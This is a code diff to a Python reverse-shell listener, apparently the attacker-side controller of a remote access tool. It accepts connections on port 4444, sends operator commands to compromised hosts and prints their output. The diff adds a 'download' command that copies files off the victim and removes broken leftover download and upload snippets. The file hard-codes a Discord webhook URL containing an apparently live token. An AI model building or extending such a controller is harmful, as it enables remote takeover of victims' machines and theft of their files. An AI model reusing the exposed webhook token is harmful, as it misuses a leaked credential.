@@ -1,8 +1,9 @@
 import socket
 import threading
 import requests
+import os
 
-WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383916610019918029/pf_qhfokCz4r-DO1tFjAPXBWpstlC5Q8y3NgvwR9I4v30ixn2acQFOG7oW45pSfqWrdO'  # Replace with your webhook
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1383916610019918029/pf_qhfokCz4r-DO1tFjAPXBWpstlC5Q8y3NgvwR9I4v30ixn2acQFOG7oW45pSfqWrdO'  # Use your own webhook
 
 def handle_client(client_socket, address):
     print(f"[+] Connection from {address}")
@@ -11,14 +12,27 @@ def handle_client(client_socket, address):
     while True:
         try:
             command = input(f"Shell@{address}> ")
+
             if command.lower() == 'exit':
                 client_socket.send(b'exit')
                 client_socket.close()
                 break
 
-            client_socket.send(command.encode())
-            response = client_socket.recv(4096).decode()
-            print(response)
+            # Handle DOWNLOAD
+            elif command.startswith("download "):
+                filename = command.split(" ", 1)[1]
+                client_socket.send(command.encode())
+
+                with open(f"downloaded_{os.path.basename(filename)}", "wb") as f:
+                    data = client_socket.recv(1024 * 100)
+                    f.write(data)
+                print(f"[+] Downloaded file saved as downloaded_{filename}")
+
+            # Handle all other commands
+            else:
+                client_socket.send(command.encode())
+                response = client_socket.recv(4096).decode()
+                print(response)
 
         except Exception as e:
             print(f"[-] Connection lost: {e}")
@@ -36,26 +50,4 @@ def start_listener(ip='0.0.0.0', port=4444):
         thread.start()
 
 start_listener()
-
-#Download files#
-
-import os
-
-elif cmd.startswith("download "):
-    path = cmd.split(" ", 1)[1]
-    if os.path.exists(path):
-        with open(path, "rb") as f:
-            data = f.read()
-        s.sendall(data)
-    else:
-        s.send(b"File not found.")
-
-#uploads files#
-
-elif command.startswith("upload "):
-    path = command.split(" ", 1)[1]
-    client_socket.send(command.encode())
-    with open(path, "rb") as f:
-        client_socket.send(f.read())
-
 
